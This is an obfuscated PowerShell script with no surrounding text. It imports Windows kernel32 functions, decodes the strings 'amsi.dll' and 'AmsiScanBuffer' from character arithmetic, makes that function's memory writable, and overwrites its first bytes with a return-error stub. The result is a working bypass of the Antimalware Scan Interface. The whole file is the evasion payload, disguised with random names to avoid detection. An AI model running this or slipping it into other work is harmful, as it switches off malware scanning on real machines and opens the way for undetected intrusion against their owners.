$MQnos3sxK7MGbSKzYZVu = @"
using System;
using System.Runtime.InteropServices;
public class MQnos3sxK7MGbSKzYZVu {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr EmvYCLO, string ATNYxR);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr dMfOx37nqEqtMnc8EzG, UIntPtr watlgvlx8cx9, uint xR6NHKaC5xvrJAvUmf, out uint k55pOFfgYEzvxBNyTm);
}
"@

Add-Type $MQnos3sxK7MGbSKzYZVu

$__7nD8nbMYAGZG = [MQnos3sxK7MGbSKzYZVu]::LoadLibrary("$([chAr]([ByTe]0x61)+[ChAr]([bytE]0x6d)+[cHAr](115*98/98)+[cHAR](51+54)+[CHaR](46+4-4)+[ChaR]([Byte]0x64)+[cHAr](108*66/66)+[CHAr]([Byte]0x6c))")
$Ptie0C = [MQnos3sxK7MGbSKzYZVu]::GetProcAddress($__7nD8nbMYAGZG, "$([ChAr](65)+[CHAr](109*103/103)+[CHar](115*109/109)+[cHar]([BYTe]0x69)+[ChAR]([BytE]0x53)+[chAr]([byTe]0x63)+[ChaR]([Byte]0x61)+[chaR](110*72/72)+[ChAR](56+10)+[cHar](35+82)+[chaR](102)+[char]([byTE]0x66)+[chaR](101)+[CHAr]([bYTe]0x72))")
$p = 0
[MQnos3sxK7MGbSKzYZVu]::VirtualProtect($Ptie0C, [uint32]5, 0x40, [ref]$p)
$v8lH8Bqr2RTyEbCGfrZ = "0xB8"
$_WtxAv = "0x57"
$vPedAMy = "0x00"
$LzyQ9fVcHSzBs82h = "0x07"
$lgqL = "0x80"
$EGYZGC = "0xC3"
$Sdtg0h = [Byte[]] ($v8lH8Bqr2RTyEbCGfrZ,$_WtxAv,$vPedAMy,$LzyQ9fVcHSzBs82h,+$lgqL,+$EGYZGC)
[System.Runtime.InteropServices.Marshal]::Copy($Sdtg0h, 0, $Ptie0C, 6)